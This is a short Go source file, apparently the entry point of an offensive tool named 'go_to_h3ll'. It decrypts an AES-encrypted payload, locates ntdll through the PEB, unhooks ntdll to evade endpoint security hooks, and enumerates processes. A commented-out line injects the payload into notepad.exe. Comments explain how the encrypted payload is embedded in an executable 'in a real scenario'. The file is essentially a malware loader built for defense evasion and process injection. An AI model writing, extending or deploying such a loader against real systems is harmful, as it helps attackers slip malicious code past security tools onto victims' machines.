package main

import (
	"fmt"
	"go_to_h3ll/core"
	"go_to_h3ll/encryption"
	"go_to_h3ll/evasion"
	"go_to_h3ll/execution"
)

func main() {
	//you insert the payload in encryption/AES_encrypt_payload.go and encrypt it in encryption_details.txt, in a real scenario you have to insert the encrypted payload inside the exe
	encryption.Encrypt()

	//normally you call Decrypt() directly in a real scenario
	buf := encryption.Decrypt()
	fmt.Println((len(buf)))

	hNtdll, err := core.GetModuleHandleFromPEB("nTdll.dll")
	if err != nil {
		fmt.Println("error getting handle from GetModuleHandleFromPEB")
		return
	}

	core.CheckLoadNtFunctions(hNtdll) //check if the unhooking works
	evasion.UnhookNtdll(hNtdll)
	//fmt.Println("PID : ", execution.ProcessEnumerationNt("csrss.exe", hNtdll))
	execution.ProcessEnumerationNtEnhanced("", hNtdll)

	//execution.ProcessInjectionUnhooked(uintptr(execution.ProcessEnumeration("notEpad.exe")), &buf[0], uintptr(len(buf))) //inject into notepad.exe address space
	//fmt.Println(processEnumeration("notepad.exe"))
}
